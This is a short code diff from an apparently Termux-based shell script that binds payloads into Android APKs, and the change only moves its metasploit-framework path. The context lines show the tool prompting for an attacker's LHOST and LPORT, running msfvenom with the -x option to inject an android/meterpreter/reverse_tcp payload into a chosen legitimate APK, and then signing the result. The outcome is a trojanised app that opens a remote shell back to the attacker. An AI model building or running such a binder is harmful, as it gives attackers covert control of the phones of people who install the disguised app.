@@ -268,7 +268,7 @@ read garbage
 exit
 else
 OUTPUT=`ls | sed -n $option'p'`
-cp $DIR/binder/$OUTPUT $HOME/metasploit-framework
+cp $DIR/binder/$OUTPUT $PREFIX/opt/metasploit-framework
 echo -e "$purple [*] Please enter following details :-"
 echo " [*] LHOST :-"
 read lhost
@@ -279,7 +279,7 @@ read output
 echo
 echo -e "$blue [*] Please wait while binding.......🕜"
 echo
-cd $HOME/metasploit-framework
+cd $PREFIX/opt/metasploit-framework
 msfvenom -x $OUTPUT -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport
 
 echo -e "$green signing apk ......."
